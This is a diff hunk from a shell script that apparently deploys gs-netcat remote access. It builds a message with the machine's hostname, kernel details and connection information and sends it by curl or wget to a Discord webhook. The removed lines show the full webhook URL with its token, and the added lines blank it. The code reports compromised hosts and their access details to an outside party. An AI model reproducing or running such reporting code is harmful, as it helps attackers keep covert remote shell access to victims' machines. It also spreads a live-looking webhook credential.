@@ -90,8 +90,8 @@ msg='$(hostname) --- $(uname -rom) --- ${GS_HOST:+GS_HOST=${GS_HOST} }gs-netcat 
 GS_DISCORD_KEY="0"
 [[ -n $GS_DISCORD_KEY ]] && {
 	data='{"username": "gsocket", "content": "'"${msg}"'"}'
-	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/1497463587374108827/IrbOiOlkqMrAErXVvbnK21cuMM8fnEV6vtFi26Rdh_XG9FyjrMPkCbVOMll15WTrzzdR")
-	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/1497463587374108827/IrbOiOlkqMrAErXVvbnK21cuMM8fnEV6vtFi26Rdh_XG9FyjrMPkCbVOMll15WTrzzdR")
+	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "")
 }
 unset data msg
 
